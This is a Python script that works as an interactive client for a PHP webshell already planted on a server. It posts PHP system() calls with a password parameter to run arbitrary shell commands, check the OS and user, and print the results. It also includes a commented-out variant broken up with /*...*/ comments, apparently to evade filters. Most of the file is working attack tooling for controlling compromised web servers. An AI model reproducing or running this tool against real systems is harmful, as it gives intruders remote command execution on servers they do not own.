#conding=utf-8
#version 1.1
import requests
import sys
if sys.platform=='linux':
    import readline
    
if len(sys.argv)==3:
    url=sys.argv[1]
    password=sys.argv[2]
else:
    url = input('webshell_address:')
    if url=='exit()':exit(0)
    password=input('webshell_password:')
    if password=='exit()':exit(0)
print('注意:\ncd 只能单独执行\n不会提示目录不存在')
print('------------start------------')

def checkos():
    #check_os={password:"e/*asdasdas*/cho strt/*asdasdas*/oupper(su/*asdasdas*/bstr(P/*asdasdas*/HP_OS,0,3));"}
    check_os={password:"echo strtoupper(substr(PHP_OS,0,3));"}
    nowos=requests.post(url,check_os)
    nowos.encoding='utf-8'
    if nowos.text=='WIN':
        return 'win'
    else:
        return 'linux'

def get_path(ostype):
    if ostype=='win':
        pwd={password:"system('dir');"}
        now_path=requests.post(url,pwd)
        now_path.encoding='gbk'
        now_path=now_path.text.split('\n')[3].split(' ')[1]
    else:
        pwd={password:"system('pwd');"}
        now_path=requests.post(url,pwd)
        now_path.encoding='utf-8'
        now_path=now_path.text
    return now_path

def get_who(ostype):
    whoami={password:"system('whoami');"}
    who=requests.post(url,whoami)
    if ostype=='win':
        who.encoding='gbk'
    else:
        who.encoding='utf-8'
    who=who.text.replace('\r','').replace('\n','')
    return who

def virtual_cd(code):
    temp=code.split(' ')[1]
    if temp[0]=='/':
        now_path=temp
    else:
        now_path=now_path+'/'+temp

ostype=checkos()
now_path=get_path(ostype)



while True:
    print(now_path)
    who=get_who(ostype)
    if who=='root':
        who='#'+who
    else:
        who='$'+who
    code=input(who+' >')
    if code=='exit()':
        break
    
    if code.find('cd')!=-1:
        temp=code.split(' ')[1]
        if temp[0]=='/':
            now_path=temp
        else:
            now_path=now_path+'/'+temp
        continue
    if ostype=='win':
        php="system('cd "+now_path+" && "
        php=php+code+"');"
        data={password:php}
        result=requests.post(url,data)
        result.encoding='gbk'
        result=result.text
        print(result)
    else:
        php="system('cd "+now_path+" && "
        php=php+code+"');"
        data={password:php}
        result=requests.post(url,data)
        result.encoding='utf-8'
        result=result.text
        print(result)
print('------------end------------')